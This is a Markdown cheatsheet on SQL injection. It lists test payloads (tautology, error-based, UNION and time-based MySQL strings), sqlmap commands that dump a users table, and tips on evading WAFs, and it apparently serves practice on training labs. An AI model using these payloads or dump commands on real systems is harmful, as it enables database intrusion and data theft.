# SQL Injection Cheatsheet

## Detection

- Error-based: look for DB errors in responses when injecting invalid syntax like `'` or `"`.
- Union-based: try `UNION SELECT` to extract columns.
- Boolean-based blind: use payloads that change true/false conditions and observe page differences.
- Time-based blind: use `SLEEP()` or `BENCHMARK()` to measure time delays.

## Common test payloads

- Test for injection:

```sql
' OR '1'='1
' OR '1'='1' -- 
' OR '1'='1' /*
"
'") OR ('1'='1
```

- Error-based (MySQL):

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```

- Union-based example (find column count):

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

- Time-based (MySQL):

```sql
' OR IF(1=1,SLEEP(5),0) -- 
```

## Extraction techniques

- Use `UNION SELECT` with `CONCAT()` to combine columns for extraction.
- For blind SQLi, enumerate characters using binary search on ASCII values to reduce requests.
- Extract schema from `information_schema.tables` and `information_schema.columns`.

## SQLmap quick flags

- Basic run:

```bash
sqlmap -u "http://target/vuln.php?id=1" --batch
```

- Force GET/POST:

```bash
sqlmap -u "http://target/vuln.php?id=1" --data="id=1" --risk=3 --level=5 --batch
```

- Dump a specific table:

```bash
sqlmap -u "http://target/vuln.php?id=1" -D dbname -T users --dump
```

## Practical notes

- Always test predictable, low-impact payloads first.
- Watch for WAFs and input filtering — try encoding, case variations, and alternative functions.
- When practicing on PortSwigger Academy, take careful notes on the exact request/response differences that indicate boolean/time behaviors.
